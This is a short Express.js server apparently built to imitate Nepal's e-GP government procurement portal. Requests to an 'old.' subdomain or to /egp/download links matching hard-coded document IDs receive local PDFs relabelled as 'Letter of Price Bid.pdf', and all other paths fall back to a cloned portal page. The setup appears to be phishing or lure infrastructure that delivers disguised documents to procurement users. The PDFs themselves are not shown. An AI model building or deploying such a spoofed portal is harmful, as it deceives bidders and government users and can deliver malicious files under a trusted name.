const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

function getPdfForRequest(req) {
  const url = req.url || '';
  const docId = String(req.query.docId || '');
  const alfId = String(req.query.alfId || '');
  const isFirstLink = docId.includes('90915527') || alfId.includes('0ef3b48a') || url.includes('90915527') || url.includes('0ef3b48a');
  
  const targetFile = isFirstLink ? 'School_Building_Hemganga.pdf' : 'Road_Upgrading_Masani.pdf';
  let targetPath = path.join(__dirname, targetFile);
  if (!fs.existsSync(targetPath)) {
    targetPath = path.join(__dirname, 'Letter of Price BidD.pdf');
  }
  return targetPath;
}

// Route to view the 1-click download HTML page directly
app.get('/download-page', (req, res) => {
  res.sendFile(path.join(__dirname, 'download.html'));
});

// Explicit download routes for both /egp/download, //egp/download, /download
app.use((req, res, next) => {
  const host = (req.headers.host || '').toLowerCase();
  const url = req.url || '';
  
  if (
    host.startsWith('old.') ||
    req.query.subdomain === 'old' ||
    url.includes('/egp/download') ||
    url.startsWith('/download')
  ) {
    const filePath = getPdfForRequest(req);
    if (fs.existsSync(filePath)) {
      res.setHeader('Content-Type', 'application/pdf');
      res.setHeader('Content-Disposition', 'attachment; filename="Letter of Price Bid.pdf"');
      return res.sendFile(filePath);
    }
  }
  next();
});

// Static assets
app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname)));

// Catch-all fallback to index.html for main portal
app.use((req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Nepal e-GP app running on http://localhost:${PORT}`);
});
